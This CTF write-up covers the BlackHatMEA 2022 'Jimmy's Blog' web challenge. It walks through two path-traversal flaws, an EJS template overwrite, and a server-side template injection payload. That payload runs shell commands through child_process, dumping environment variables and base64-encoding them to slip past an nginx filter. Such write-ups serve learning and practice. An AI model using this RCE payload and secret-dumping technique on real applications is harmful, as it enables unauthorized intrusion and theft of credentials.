---
title: BlackHatMEA Qualifications 2022 CTF Web Challenges Writeup
author: Muhammad Adel
date: 2022-10-01 18:52:00 +0200
categories: [CTF]
tags: [web, writeups ,ctf]
---
Peace be upon all of you, on this writeup I am going to cover the solutions of some web challenges from [BlackHatMEA](https://ctf.sa) CTF. We have participated under the team **0xCha0s**.

## **Jimmy's Blog**

**Difficulty:** Hard 

**Description:** The technology is always evolving, so why do we still stick with password-based authentication? That makes no sense! That's why I designed my own password-less login system. I even open-sourced it for everyone interested, how nice of me!

The Challenge begins with a normal blog that contains two articles:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FFHNoqzPoTbVwni6QQzj4%2Fimage.png?alt=media&token=77293630-cbd3-47a7-96ee-5ed9c04f4ea0)
We have a login and registration pages. but instead of implementing a normal username and password. it generate a key attached to your username:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FxIi2Lv0u8snvewL5svxE%2Fimage.png?alt=media&token=79686d0c-214a-433a-8f2f-acee0ab5655b)
We will enter a random username then we will get our key to login with:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FXaJcaRnSOPvZH9HMUc09%2Fimage.png?alt=media&token=65351816-46cf-4347-9697-b828741bd8ac)
Once logged in, We will get redirected to the main page again with the articles. As we have the source code let's examine the important parts:

**index.js**
```javascript
app.get("/", (req, res) => {
    const article_paths = fs.readdirSync("articles");
    let articles = []
    for (const article_path of article_paths) {
        const contents = fs.readFileSync(path.join("articles", article_path)).toString().split("\n\n");
        articles.push({
            id: article_path,
            date: contents[0],
            title: contents[1],
            summary: contents[2],
            content: contents[3]
        });
    }
    res.render("index", {session: req.session, articles: articles});
})

app.get("/article", (req, res) => {
    const id = parseInt(req.query.id).toString();
    const article_path = path.join("articles", id);
    try {
        const contents = fs.readFileSync(article_path).toString().split("\n\n");
        const article = {
            id: article_path,
            date: contents[0],
            title: contents[1],
            summary: contents[2],
            content: contents[3]
        }
        res.render("article", { article: article, session: req.session, flag: process.env.FLAG });
    } catch {
        res.sendStatus(404);
    }
})

app.get("/login", (req, res) => {
    res.render("login", {session: req.session});
})

app.get("/register", (req, res) => {
    res.render("register", {session: req.session});
})

app.post("/register", (req, res) => {
    const username = req.body.username;
    const result = utils.register(username);
    if (result.success) res.download(result.data, username + ".key");
    else res.render("register", { error: result.data, session: req.session });
})

app.post("/login", upload.single('key'), (req, res) => {
    const username = req.body.username;
    const key = req.file;
    const result = utils.login(username, key.buffer);
    if (result.success) { 
        req.session.username = result.data.username;
        req.session.admin = result.data.admin;
        res.redirect("/");
    }
    else res.render("login", { error: result.data, session: req.session });
})

app.get("/logout", (req, res) => {
    req.session.destroy();
    res.redirect("/");
})

app.get("/edit", (req, res) => {
    if (!req.session.admin) return res.sendStatus(401);
    const id = parseInt(req.query.id).toString();
    const article_path = path.join("articles", id);
    try {
        const article = fs.readFileSync(article_path).toString();
        res.render("edit", { article: article, session: req.session, flag: process.env.FLAG });
    } catch {
        res.sendStatus(404);
    }
})

app.post("/edit", (req, res) => {
    if (!req.session.admin) return res.sendStatus(401);
    try {
        fs.writeFileSync(path.join("articles", req.query.id), req.body.article.replace(/\r/g, ""));
        res.redirect("/");
    } catch {
        res.sendStatus(404);
    }
})

app.listen(3000, () => {
    console.log("Server running on port 3000");
}) 
```
**utils.js**
```javascript
const db = new sqlite(":memory:");

db.exec(`
    DROP TABLE IF EXISTS users;

    CREATE TABLE IF NOT EXISTS users (
        id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        username   VARCHAR(255) NOT NULL UNIQUE,
        admin      INTEGER NOT NULL
    )
`);

register("jimmy_jammy", 1);

function register(username, admin = 0) {
    try {
        db.prepare("INSERT INTO users (username, admin) VALUES (?, ?)").run(username, admin);
    } catch {
        return { success: false, data: "Username already taken" }
    }
    const key_path = path.join(__dirname, "keys", username + ".key");
    const contents = crypto.randomBytes(1024);
    fs.writeFileSync(key_path, contents);
    return { success: true, data: key_path };
}

function login(username, key) {
    const user = db.prepare("SELECT * FROM users WHERE username = ?").get(username);
    if (!user) return { success: false, data: "User does not exist" };

    if (key.length !== 1024) return { success: false, data: "Invalid access key" };
    const key_path = path.join(__dirname, "keys", username + ".key");
    if (key.compare(fs.readFileSync(key_path)) !== 0) return { success: false, data: "Wrong access key" };
    return { success: true, data: user };
}

module.exports = { register, login };
```

Looking carefully at the source code we can notice the following:

- On utils.js, We can notice that we have two different privileges for the application normal users and admin. but you can't register an admin user because we can't control the value of admin=0 on line 15.
- On utils.js line 13, We have an admin user called ```jimmy_jammy```.
- On utils.js line 21, notice that we can control the value of the username variable that means we have a path traversal vulnerability.
- On utils.js line 21-24, We can exploit the path traversal vulnerability to overwrite the admin (jimmy_jammy) with a new key and login with it. Note that, Our starting directory is keys.

So now we can register by the following username to get the key of the admin user:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FcisnW3IiljNCskACVFw7%2Fimage.png?alt=media&token=023e8b0c-ee49-4a93-8be4-229ad7691e6b)
the admin key will get downloaded, let's login with it:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2F8Y0fc9iIcRkFFKTFTKvP%2Fimage.png?alt=media&token=6b2fbdb0-7521-44e6-97cc-d4ec30a52632)
Great! as we became admin let's search for the flag, in the source code the flag is in the /edit route:
```javascript
app.get("/edit", (req, res) => {
    if (!req.session.admin) return res.sendStatus(401);
    const id = parseInt(req.query.id).toString();
    const article_path = path.join("articles", id);
    try {
        const article = fs.readFileSync(article_path).toString();
        res.render("edit", { article: article, session: req.session, flag: process.env.FLAG });
    } catch {
        res.sendStatus(404);
    }
})
```
what?
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FyHqhmlV9fglQs3BDOObE%2Fimage.png?alt=media&token=6ffd0f06-9152-4592-83b9-53856b63f3d8)
In the source code we have seen that if you visited the ```/edit``` route the flag would be given to you. but what is the problem? going back to the source code again I have noticed the following in the ```nginx.conf``` file:
```nginx
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        server_name _;

        location / {
	    # Replace the flag so nobody steals it!
            sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';
            sub_filter_once off;
            proxy_pass http://localhost:3000;
        }
}
```
Hmmm! the real flag is being replaced by this word *"oof, that was close, glad i was here to save the day"* that is why we can't see the real flag. So to read the real flag we need to have access to the system not the web application because the real flag is being replaced in the by a fake one. let's take a close look at the edit functionality again:
```javascript
app.get("/edit", (req, res) => {
    if (!req.session.admin) return res.sendStatus(401);
    const id = parseInt(req.query.id).toString();
    const article_path = path.join("articles", id);
    try {
        const article = fs.readFileSync(article_path).toString();
        res.render("edit", { article: article, session: req.session, flag: process.env.FLAG });
    } catch {
        res.sendStatus(404);
    }
})

app.post("/edit", (req, res) => {
    if (!req.session.admin) return res.sendStatus(401);
    try {
        fs.writeFileSync(path.join("articles", req.query.id), req.body.article.replace(/\r/g, ""));
        res.redirect("/");
    } catch {
        res.sendStatus(404);
    }
})
```
Have you noticed it? Path Traversal Again!

at line 16, we can see that the id parameter is being passed without a filter to ```path.join()``` function which allow us to control the value of the path. but this time the function is inside ```writeFileSyncwhich()``` allow us to write data inside any file of our choice. let's get RCEE!

but first we need to determine which file we are going to override:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FHmLns57EA13JouwNz7na%2Fimage.png?alt=media&token=dbbc5354-584f-492e-8f3d-818837a39626)
As you can see EJS template is being used. So we can override any of these files and executing commands via SSTI. Let's intercept the edit request and overwrite the file:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2Fi8zdTVdjlLbypkGvzTPY%2Fimage.png?alt=media&token=3444497f-a19e-4b47-91cb-ad43597d5aac)
Since the ```id``` parameter is vulnerable so we will path for the file that we want to override and add the data inside ```article``` parameter. send the request and refresh the page.
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FebI5akRJeHCevsWPFE8W%2Fimage.png?alt=media&token=55f9d816-b60b-449b-97c3-9d020d146082)
SSTI is working now! doing some research, I have found the following command and used it to get RCE.
```javascript
global.process.mainModule.require('child_process').execSync('ls').toString()
```
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FjDRtO25sNAQPwxDNKnwj%2Fimage.png?alt=media&token=5bfbed2c-10d8-4b23-b144-c993bcf3675a)
Going back to the source code and search to know where the flag is located:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FCoAeToDZXCuJZKirDtsn%2Fimage.png?alt=media&token=ea45ec77-7329-4e7f-a60e-fd1b8b5db14a)
So the flag is being stored inside the environment variables let's dump the environment variable by running the ```env``` command:
```javascript
global.process.mainModule.require('child_process').execSync('env').toString()
```
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2F3RFVnvelNxosAvKj1tFX%2Fimage.png?alt=media&token=e204d22d-f57f-4de7-9284-86c5378d570b)

The Flag is there but why we are getting the *"oof, that was close, glad i was here to save the day"* instead of the real flag? do you remember the nginx.conf file behavior. every time the real flag  
printed in the web page it will be replaced by the previous dummy sentence. let's get around this behavior by base64 encode the output of the ```env``` command.
```javascript
global.process.mainModule.require('child_process').execSync('env | base64').toString()
```
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FF2PlM0zspyu32CziKfp7%2Fimage.png?alt=media&token=3c478e99-a386-444b-9de1-dd291ef6aba2)

let's decode this value and Voila!
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MeU8PSC8pJwv8a582oA%2Fuploads%2FUYHrgvyJevyLKLkEsRvs%2Fimage.png?alt=media&token=1c525042-0b4e-447e-8ce3-d1bf87234af1)

## **Black Notes**

**Difficulty:** Medium

**Description:** We created this website for hackers to save their payloads and notes in a secure way!

My team mate **0xMesbaha** have written a writeup for it got check it out from the following link:

[https://hussienmisbah.github.io/post/black-notes/](https://hussienmisbah.github.io/post/black-notes/)

## **Meme Generator**

**Difficulty:** Medium

[https://hussienmisbah.github.io/post/meme-generator/](https://hussienmisbah.github.io/post/meme-generator/)